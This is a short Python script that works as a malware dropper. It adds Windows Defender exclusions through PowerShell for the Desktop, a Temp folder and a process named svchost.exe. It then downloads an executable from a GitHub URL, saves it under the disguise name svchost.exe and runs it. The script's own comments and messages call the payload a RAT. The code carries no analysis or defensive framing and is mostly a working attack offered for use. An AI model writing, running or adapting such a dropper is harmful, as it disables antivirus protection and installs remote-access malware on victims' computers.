import os
import subprocess
import requests
import ctypes

# Path to svchost.exe on GitHub
github_url = "https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"

# Local paths
desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
rat_path = os.path.join(desktop_path, 'svchost.exe')
temp_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\\Roaming\\Temp')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_defender_exclusions():
    try:
        if not is_admin():
            print("Please run the script as administrator.")
            return

        # Add folder exclusion
        subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{temp_path}"'], check=True, shell=True)
        
        # Add file exclusion
        subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{rat_path}"'], check=True, shell=True)
        
        # Add process exclusion
        subprocess.run(['powershell', '-Command', 'Add-MpPreference -ExclusionProcess "svchost.exe"'], check=True, shell=True)
        
        # Add desktop exclusion (assuming you meant the entire desktop for simplicity)
        subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{desktop_path}"'], check=True, shell=True)
    except Exception as e:
        print(f"Failed to add exclusions: {e}")

def download_rat(url, path):
    try:
        response = requests.get(url)
        with open(path, 'wb') as file:
            file.write(response.content)
    except Exception as e:
        print(f"Failed to download RAT: {e}")

def run_rat(path):
    try:
        subprocess.run([path], check=True)
    except Exception as e:
        print(f"Failed to run RAT: {e}")

if __name__ == "__main__":
    add_defender_exclusions()
    download_rat(github_url, rat_path)
    run_rat(rat_path)
